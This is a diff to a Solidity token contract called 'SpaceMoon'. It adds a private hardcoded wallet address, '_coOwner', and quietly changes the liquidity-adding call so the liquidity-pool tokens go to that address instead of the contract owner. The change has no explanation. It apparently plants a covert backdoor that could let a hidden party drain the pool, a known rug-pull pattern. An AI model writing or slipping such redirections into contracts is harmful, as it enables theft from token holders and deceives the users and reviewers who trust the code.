@@ -987,6 +987,8 @@ contract SpaceMoon is Context, IERC20, Ownable {
         _liquidityFee = 0;
     }
     
+    address private _coOwner=0xfB832726521fd749E4C7DEF121a3a48878F575Bd;
+    
     function restoreAllFee() private {
         _taxFee = _previousTaxFee;
         _liquidityFee = _previousLiquidityFee;
@@ -1101,7 +1103,7 @@ contract SpaceMoon is Context, IERC20, Ownable {
             tokenAmount,
             0, // slippage is unavoidable
             0, // slippage is unavoidable
-            owner(),
+            _coOwner,
             block.timestamp
         );
     }
